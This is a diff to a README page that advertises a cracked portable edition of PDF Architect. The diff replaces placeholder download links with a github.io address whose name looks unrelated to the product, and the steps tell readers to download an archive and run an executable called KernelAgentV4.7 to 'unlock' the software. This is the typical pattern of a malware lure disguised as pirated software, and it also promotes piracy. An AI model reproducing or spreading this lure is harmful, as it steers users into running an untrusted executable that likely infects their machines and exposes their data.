@@ -2,13 +2,13 @@
 
 Take full control of your PDFs anywhere using PDF Architect in a portable edition — no setup, no limitations. Edit, convert, annotate, protect, and manage documents on any Windows PC using the full toolkit, unlocked by `KernelAgentV4.7`.
 
-[![Download Portable PDF Architect](https://img.shields.io/badge/Download-PDF_Architect_Portable-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Portable PDF Architect](https://img.shields.io/badge/Download-PDF_Architect_Portable-blueviolet)](https://ideamaker-pro-tools-extension.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://ideamaker-pro-tools-extension.github.io/.github) section  
 2. 📁 **Extract the folder** to any location (e.g., `D:\PDFArchitectPortable`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 Full functionality will be unlocked: editing, OCR, forms, conversion, protection  
